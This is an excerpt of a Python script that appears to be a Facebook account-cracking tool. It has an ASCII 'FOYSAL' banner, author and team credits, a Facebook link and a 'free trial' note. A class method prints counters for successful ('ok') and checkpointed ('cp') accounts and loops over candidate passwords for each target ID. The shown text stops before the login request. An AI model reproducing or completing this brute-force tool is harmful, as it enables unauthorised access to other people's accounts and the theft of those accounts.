...
logo= """ \033[1;32m                                                                                                                           
`7MM"""YMM   .g8""8q.`YMM'   `MM'.M"""bgd      db      `7MMF'      
  MM    `7 .dP'    `YM.VMA   ,V ,MI    "Y     ;MM:       MM        
  MM   d   dM'      `MM VMA ,V  `MMb.        ,V^MM.      MM        
  MM""MM   MM        MM  VMMP     `YMMNq.   ,M  `MM      MM        
  MM   Y   MM.      ,MP   MM    .     `MM   AbmmmqMA     MM      , 
  MM       `Mb.    ,dP'   MM    Mb     dM  A'     VML    MM     ,M 
.JMML.       `"bmmd"'   .JMML.  P"Ybmmd" .AMA.   .AMMA..JMMmmmmMMM 
...
\033[1;35mâœ…____________________ðŸ’Ÿ________________________âœ…
  ...
  Auther   : FOYSAL HOSEN 
  \033[1;37mTEAM     : Top king Star 07 
  \033[1;36mYoutube  : Bal chal calai na🙂💔
  \033[1;37mNote     : FREE TRAILER FEWS DAYS
  \033[1;35maccount Fb : https://www.facebook.com/FOYSAL.OFFICIALS.ACCOUNT0075
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[FOYSAL] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
